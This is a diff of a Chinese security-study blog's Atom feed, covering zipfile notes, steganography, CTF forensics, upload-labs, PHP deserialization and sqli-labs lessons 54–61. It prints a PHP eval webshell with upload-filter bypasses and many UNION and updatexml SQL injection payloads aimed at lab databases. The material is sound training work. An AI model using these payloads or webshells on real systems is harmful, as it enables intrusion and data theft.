+    <content type="html"><![CDATA[<p>**因为看到misc题目要手写脚本打开压缩包，于是想系统地学习一下python的zipfile模块，<del>顺便水一篇博客</del>**，<a href="https://blog.csdn.net/weixin_43677350/article/details/84071552?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考zipfile zip文件操作</a></p><h1 id="zipfile"><a href="#zipfile" class="headerlink" title="zipfile"></a>zipfile</h1><h2 id="zipfile-getinfo-name"><a href="#zipfile-getinfo-name" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能：获取zip文档內指定对象文件的信息。返回一个zipfile.zipinfo对象，它包含文件的详细信息。</p><h2 id="zipfile-infolist"><a href="#zipfile-infolist" class="headerlink" title="zipfile.infolist()"></a>zipfile.infolist()</h2><p>功能：获取zip文档內所有文件的信息返回一个zipfile.zipinfo列表</p><h2 id="zipfile-namelist"><a href="#zipfile-namelist" class="headerlink" title="zipfile.namelist()"></a>zipfile.namelist()</h2><p>功能：获取zip文档內所有文件的名称列表。</p><h2 id="zipfile-extract-memeber-path-pwd"><a href="#zipfile-extract-memeber-path-pwd" class="headerlink" title="zipfile.extract(memeber[,path[,pwd]])"></a>zipfile.extract(memeber[,path[,pwd]])</h2><p>功能：将zip文件內的制定文件解压到当前目录。</p><p>参数：</p><p>memeber      指定要解压的文件名称或对应的zipinfo对象</p><p>path               指定解析文件保存的文件夹</p><p>pwd                解压密码</p><h2 id="zipfile-extractall-path-memebers-pwd"><a href="#zipfile-extractall-path-memebers-pwd" class="headerlink" title="zipfile.extractall([path[,memebers[,pwd]]])"></a>zipfile.extractall([path[,memebers[,pwd]]])</h2><p>功能：解压zip文档中的所有文件到当前目录。</p><h2 id="zipfile-printdir"><a href="#zipfile-printdir" class="headerlink" title="zipfile.printdir()"></a>zipfile.printdir()</h2><p>功能：将zip文档內的信息打印到控制台上。</p><h2 id="zipfile-setpassword-pwd"><a href="#zipfile-setpassword-pwd" class="headerlink" title="zipfile.setpassword(pwd)"></a>zipfile.setpassword(pwd)</h2><p>功能：设置zip文档的密码。</p><h2 id="zipfile-read-name-pwd"><a href="#zipfile-read-name-pwd" class="headerlink" title="zipfile.read(name[,pwd])"></a>zipfile.read(name[,pwd])</h2><p>功能：获取zip文档指定文件的二进制数据。 </p><h2 id="zipfile-getinfo-name-1"><a href="#zipfile-getinfo-name-1" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能返回一个zipinfo对象，表示zip文档中相对应的文件信息。</p><p>支持以下属性：</p><p>zipinfo.filename           获取文件的名称</p><p>zipinfo.date_time        获取文件最后的修改时间。返回一个包含6个元素的元组：（年，月，日，时，分，秒）</p><p>zipinfo.compress_type  压缩类型</p><p>zipinfo.comment           文档说明</p><p>zipinfo.extr                    文件的扩展数据</p><p>zipinfo.create_system   获取创建文件的系统</p><p>zipinfo.create_version   获取创建文件的PKZIP版本</p><p>zipinfo.extract_versio      获取创建、解压zip文档的PKZIP所需要的PKZIP版本</p><p>zipinfo.reserved               预留字段，当前实现总是返回0</p><p>zipinfo.flag_bites              zip标志位</p><p>zipinfo.volume                  文件头的卷标</p><p>zipinfo.internal_attr           内部属性</p><p>zipinfo.external_attr           外部属性</p><p>zipinfo.header_offset          文件头偏移位</p><p>zipinfo.CRC                        未压缩文件的CRC-32</p><p>zipinfo.conpress_size          获取压缩后的大小</p><p>zipinfo.file_size                     获取未压缩文件的大小</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;p&gt;**因为看到misc题目要手写脚本打开压缩包，于是想系统地学习一下python的zipfile模块，&lt;del&gt;顺便水一篇博客&lt;/del&gt;**，&lt;a href=&quot;https://blog.csdn.net/weixin_43677350/article/details/840</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="python" scheme="http://example.com/categories/python/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="python" scheme="http://example.com/tags/python/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>misc总结之图片隐写术</title>
+    <link href="http://example.com/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/"/>
+    <id>http://example.com/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/</id>
+    <published>2022-02-27T04:46:16.000Z</published>
+    <updated>2022-03-01T11:32:30.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<p>内容参考<a href="https://xz.aliyun.com/t/1833">MISC总结—隐写术之图片隐写</a></p><h1 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h1><ol><li>附加件的图片隐写</li><li>基于文件结构的图片隐写</li><li>基于LSB原理的图片隐写</li><li>基于DCT域的JPG图片隐写</li><li>数字水印的隐写</li><li>图片容差的隐写</li></ol><h1 id="第一部分-附加的图片隐写"><a href="#第一部分-附加的图片隐写" class="headerlink" title="第一部分 附加的图片隐写"></a>第一部分 附加的图片隐写</h1><p>在附加式的图片隐写术中，我们通常是用某种程序或者某种方法在裁体的文件中直接加上需要隐写的目标，然后将截体文件直接传输到接收者或者发布到网站上然后接收者根据方法提取出被隐写的对象，这一个过程就是我们这里想提到的附加图片隐写。</p><p>而在CTF赛事中，关于这种图片隐写的大概有两种经典方法，一是直接附加字符串，二是图种的形式出现</p><ol><li>用binwalk来打开</li></ol><p><img src="https://s2.loli.net/2022/03/01/kNydwRV14BJz2H6.png" alt="QQ截图20220301185619.png"></p><p><img src="https://s2.loli.net/2022/03/01/LS9dgk3inla5QXz.jpg" alt="cqzb.jpg"></p><p>就能得到</p><p><img src="https://s2.loli.net/2022/03/01/oH239L6ycYkbQdm.png" alt="QQ截图20220301185751.png"></p><p>利用linux的strings命令，对该图片进行处理</p><p><img src="https://s2.loli.net/2022/03/01/RU8xagd4e1hk95V.jpg" alt="ctf.jpg"></p><p>可以提取出字符串ZmxhZ3t3ZWxjb21lX3RvX3hpYW56aGl9</p><p><img src="https://s2.loli.net/2022/03/01/xGvKqLwdYznQmAU.png" alt="QQ截图20220301191713.png"></p><p>利用base64解密</p><p><img src="https://s2.loli.net/2022/03/01/YOmQu87VwUok2vi.png" alt="QQ截图20220301192936.png"></p><p>就可以看到flag。</p><p><img src="https://s2.loli.net/2022/03/01/d2tOADlb7Kq4m6F.png" alt="QQ截图20220301193040.png"></p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;p&gt;内容参考&lt;a href=&quot;https://xz.aliyun.com/t/1833&quot;&gt;MISC总结—隐写术之图片隐写&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&quot;内容：&quot;&gt;&lt;a href=&quot;#内容：&quot; class=&quot;headerlink&quot; title=&quot;内容：&quot;&gt;&lt;/a&gt;内容：&lt;/h1</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>misc考核</title>
+    <link href="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/"/>
+    <id>http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/</id>
+    <published>2022-02-26T07:56:43.000Z</published>
+    <updated>2022-02-26T08:23:38.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="一道目标明确的流量包取证"><a href="#一道目标明确的流量包取证" class="headerlink" title="一道目标明确的流量包取证"></a>一道目标明确的流量包取证</h1><p>首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息</p><p><img src="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png" alt="QQ截图20220226104603.png"></p><p>然后就打开ok后缀的请求包（肯定是从后往前找）</p><p>率先找到后半段flag</p><img src="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png" alt="QQ截图20220226101554.png" style="zoom:200%;" /><p>往前找还有前半段</p><img src="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png" alt="QQ截图20220226103012.png" style="zoom:200%;" /><p>千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9}</p><p>之前在buu上刷过一题更难的一题，有点类似，是叫sqltest的基于get型的时间盲注的流量包取证有点小离谱</p><h1 id="一道令人头皮发麻的签到："><a href="#一道令人头皮发麻的签到：" class="headerlink" title="一道令人头皮发麻的签到："></a>一道令人头皮发麻的签到：</h1><p>好！签到题，自信满满的打开，第一层解压：flag在里面哦</p><p>第二层：打开看看（zip伪加密）</p><p>第三层：你这么聪明看看就懂了  乱码，好！直接夹断😂</p><p>原本想一个一个去试一试，试一下是啥编码的但是看到</p><img src="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png" alt="QQ截图20220226161808.png" style="zoom;" /><p>5m在打开的一瞬间我的电脑卡了，所有的在线翻译网站都被搞爆了，就离谱😂</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;一道目标明确的流量包取证&quot;&gt;&lt;a href=&quot;#一道目标明确的流量包取证&quot; class=&quot;headerlink&quot; title=&quot;一道目标明确的流量包取证&quot;&gt;&lt;/a&gt;一道目标明确的流量包取证&lt;/h1&gt;&lt;p&gt;首先用wireshark打开流量包一看是get型请求的联合查</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>upload-libs2</title>
+    <link href="http://example.com/2022/02/24/upload-libs(2)/"/>
+    <id>http://example.com/2022/02/24/upload-libs(2)/</id>
+    <published>2022-02-24T03:51:46.000Z</published>
+    <updated>2022-02-24T03:57:26.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="upload-libs-4-黑名单"><a href="#upload-libs-4-黑名单" class="headerlink" title="upload-libs 4 (黑名单)"></a>upload-libs 4 (黑名单)</h1><p><img src="https://s2.loli.net/2022/02/24/ZqJVp4rcituwjWg.png" alt="QQ截图20220224115441.png"></p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;upload-libs-4-黑名单&quot;&gt;&lt;a href=&quot;#upload-libs-4-黑名单&quot; class=&quot;headerlink&quot; title=&quot;upload-libs 4 (黑名单)&quot;&gt;&lt;/a&gt;upload-libs 4 (黑名单)&lt;/h1&gt;&lt;p&gt;&lt;img s</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="upload-libs" scheme="http://example.com/categories/upload-libs/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="upload-libs" scheme="http://example.com/tags/upload-libs/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>upload-libs</title>
+    <link href="http://example.com/2022/02/22/upload-libs(1)/"/>
+    <id>http://example.com/2022/02/22/upload-libs(1)/</id>
+    <published>2022-02-22T07:05:07.000Z</published>
+    <updated>2022-04-21T13:12:50.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="UPload-libs（pass-1-3）"><a href="#UPload-libs（pass-1-3）" class="headerlink" title="UPload-libs（pass 1-3）"></a>UPload-libs（pass 1-3）</h1><p><img src="https://s2.loli.net/2022/02/23/HnJ8XdQLS2UgyIG.png" alt="QQ截图20220223121036.png"></p><p>  在这里我们搭建网站学习上传文件（病毒）</p><p>首先学习一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(_POST[<span class="string">&#x27;wds5418&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p> 文件上传漏洞是指程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过自身权限向服务器上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者webshell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器处理的逻辑做的不够安全，则会导致严重后果。</p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>webshell就是以asp、php、jsp或者cgi等网页文件存在的一种命令执行环境，也可以将其称为后门。攻击者在入侵了一个网站后通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网页服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。webshell后门隐蔽行高，可以轻松穿越防火墙，访问webshell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p><h1 id="pass-1-前端js验证"><a href="#pass-1-前端js验证" class="headerlink" title="pass-1(前端js验证)"></a>pass-1(前端js验证)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>法1：这一关仅仅只在前端(在查看源代码中可以看到)进行的js校验，因此可以直接对上传的内容进行抓包</p><img src="https://s2.loli.net/2022/02/23/12yxLEuaql8kw5J.png" alt="QQ截图20220223120523.png" style="zoom:150%;" /><p>对filename进行改名，将“muna.png”改成“muma.php”来使的上传的一句话木马可以执行</p><p>然后就可以连接蚁🗡了</p><p>法二：<a href="https://blog.csdn.net/chuan6699/article/details/84693236?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">浏览器禁用javascript</a>就可以绕过前端的js校验</p><h2 id="js前端校验存在的必要"><a href="#js前端校验存在的必要" class="headerlink" title="js前端校验存在的必要"></a>js前端校验存在的必要</h2><p>前端校验绕过的方法十分简单（极容易遭受攻击），但是它并不是没有存在的必要。之所以使用前端校验的方法，主要是因为效率高，用户体验好，如果所有的数据都发给服务器，再由服务器校验完之后再发给客户端，这中间需要消耗时间，用户的体验就变的不好，所以这种校验方式主要出现于CS架构的游戏类开发。但这种校验方式的开发的初衷是针对中规中矩的普通用户，当面对黑客这类群体的时候就会变得形同虚设。</p><h1 id="pass-2（MIME验证）"><a href="#pass-2（MIME验证）" class="headerlink" title="pass-2（MIME验证）"></a>pass-2（MIME验证）</h1><p>用pass-1的法一也可以，将php的后缀先改成png然后在抓包处修改文件名后缀</p><p>法二：在Content-Type：处将application/octet-stream改成image/jpeg</p><img src="https://s2.loli.net/2022/02/23/sFrlUw9OG8LV3gK.png" alt="QQ截图20220223153025.png" style="zoom:150%;" /><h2 id="MIME验证科普："><a href="#MIME验证科普：" class="headerlink" title="MIME验证科普："></a>MIME验证科普：</h2><p>mime的作用：使客户端软件，区分不同的文件类型，例如web浏览器就是通过mime类型来判断文件是GIF图片还是可以打印的POSTSCRIPT文件。<a href="https://blog.csdn.net/weixin_45728976/article/details/104333199?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考</a></p><h1 id="pass-3-黑名单验证，特殊后缀"><a href="#pass-3-黑名单验证，特殊后缀" class="headerlink" title="pass-3 (黑名单验证，特殊后缀)"></a>pass-3 (黑名单验证，特殊后缀)</h1><img src="https://s2.loli.net/2022/02/23/h6mbq9c3woXykEK.png" alt="QQ截图20220223162004.png" style="zoom:150%;" /><p>法1：可以将一句话木马的文件后缀改成.php5</p><p>法2：或者上传.htaccess文件来进绕过</p><h2 id="基于文件后缀名的验证介绍"><a href="#基于文件后缀名的验证介绍" class="headerlink" title="基于文件后缀名的验证介绍"></a>基于文件后缀名的验证介绍</h2><p>分类：</p><ol><li>基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</li><li>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</li></ol><p>可以利用Burpsuite工具截断HTTP请求，利用Intruder模块进行枚举后缀名，寻找黑名单中没有过滤的文件后缀。</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;UPload-libs（pass-1-3）&quot;&gt;&lt;a href=&quot;#UPload-libs（pass-1-3）&quot; class=&quot;headerlink&quot; title=&quot;UPload-libs（pass 1-3）&quot;&gt;&lt;/a&gt;UPload-libs（pass 1-3）&lt;/</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="upload-libs" scheme="http://example.com/categories/upload-libs/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="upload-libs" scheme="http://example.com/tags/upload-libs/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>php反序列化漏洞的认识与学习</title>
+    <link href="http://example.com/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://example.com/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/</id>
+    <published>2022-02-18T12:57:07.000Z</published>
+    <updated>2022-02-20T11:17:10.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h1><p>序列化，即将php对象转换成字符串的一种操作，目的是为了有效地保护对象，并且不丢失其类型和结构</p><p>反序列化，即将符合格式的字符串转换为php对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件来完成</p><h2 id="序列化后"><a href="#序列化后" class="headerlink" title="序列化后"></a>序列化后</h2><p>O:4:”text”:3:{s:10:”textflag”;s:7:”*text”;s:4:”text”;s:5:”text1”;}</p><p>String:s</p><p>Integer:i</p><p>Boolean:b</p><p>Null:N</p><p>Array:a</p><p>Object:o</p><p><img src="https://s2.loli.net/2022/02/19/IJe93ycmFqKSOWs.png" alt="QQ截图20220219185351.png"></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ol><li>__construct()   //当对象创建的时候自动调用（但是在unserialize()时是不会自动调用的）</li><li>__wakeup()//当unserialize()时自动调用</li><li>__destruct()//当对象被销毁时自动调用</li><li>__toString()//当反序化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li>__get()//当从不可访问的属性读取数据</li><li>__call()//在上下文中调用不可访问方法时触发</li></ol><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>php5&lt;5.6.25</p><p>php7&lt;7.0.10</p><p>unserialize（）会检查一个__wakeup()方法，如果存在，则会先调用—-wakeup()方法，预先准备对象需要的资源</p><p>反序列化时，如果对象属性个数值大于真实的属性个数时就会跳过__wakeup()的执行</p><h2 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h2><p>POP面向属性编程常用于上层语言构造特定调用连的方法，与二进制利用中的面向返回编程的原理相同，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，最终达到攻击者的目的。</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;php序列化&quot;&gt;&lt;a href=&quot;#php序列化&quot; class=&quot;headerlink&quot; title=&quot;php序列化&quot;&gt;&lt;/a&gt;php序列化&lt;/h1&gt;&lt;p&gt;序列化，即将php对象转换成字符串的一种操作，目的是为了有效地保护对象，并且不丢失其类型和结构&lt;/p&gt;
+&lt;p</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="php" scheme="http://example.com/categories/php/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="php" scheme="http://example.com/tags/php/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson54_61</title>
+    <link href="http://example.com/2022/02/08/lesson50/"/>
+    <id>http://example.com/2022/02/08/lesson50/</id>
+    <published>2022-02-08T10:18:18.000Z</published>
+    <updated>2022-02-18T12:55:56.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson54"><a href="#lesson54" class="headerlink" title="lesson54"></a>lesson54</h1><p>一般的联合查询注入，但只有十次机会</p><p>?id=1</p><p><img src="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png" alt="QQ截图20220218184638.png"></p><p>?id=1’ order by 3–+</p><p><img src="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png" alt="QQ截图20220218184904.png"></p><p>?id=1’ order by 4–+</p><p><img src="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png" alt="QQ截图20220218185026.png"></p><p>?id=-1’ union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png" alt="QQ截图20220218185205.png"></p><p>?id=-1’ union select 1,2,database()–+</p><p><img src="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png" alt="QQ截图20220218185315.png"></p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p><img src="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png" alt="QQ截图20220218192118.png"></p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’t87qfwjwea’–+</p><p><img src="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png" alt="QQ截图20220218191401.png"></p><p>?id=-1’ union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_X1KA))from challenge.t87qfwjwea–+</p><p><img src="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png" alt="QQ截图20220218192008.png"></p><p>唯一要说的就是这关如果注入超过十次，表名和字段就会变非常恶心</p><h1 id="lesson55"><a href="#lesson55" class="headerlink" title="lesson55"></a>lesson55</h1><p>?id=-1) union select 1,2,database()–+</p><p>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’7lyan613nt’–+</p><p>?id=-1) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_W8HV))from challenges.7lyan613nt–+</p><h1 id="lesson56"><a href="#lesson56" class="headerlink" title="lesson56"></a>lesson56</h1><p>?id=-1’) union select 1,2,database()–+</p><p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’lby5b1quon’–+</p><p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_6JN1))from challenges.lby5b1quon–+</p><h1 id="lesson-57"><a href="#lesson-57" class="headerlink" title="lesson 57"></a>lesson 57</h1><p>?id=-1” union select 1,2,database()–+</p><p>?id=-1” union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1” union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’2by8hxznwc’–+</p><p>?id=-1” union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_LXMN))from challenges.2by8hxznwc–+</p><h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58"></a>lesson58</h1><p>?id=1’and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’6kkc70flk9’),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JXDL))from challenges.6kkc70flk9),0x7e),1)–+</p><h1 id="lesson59"><a href="#lesson59" class="headerlink" title="lesson59"></a>lesson59</h1><p>?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’062lvunx5i’),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_2XKL))from challenges.062lvunx5i),0x7e),1)–+</p><h1 id="lesson-60"><a href="#lesson-60" class="headerlink" title="lesson 60"></a>lesson 60</h1><p>?id=1”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p><h1 id="lesson-61"><a href="#lesson-61" class="headerlink" title="lesson 61"></a>lesson 61</h1><p>?id=1’)) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1’)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from 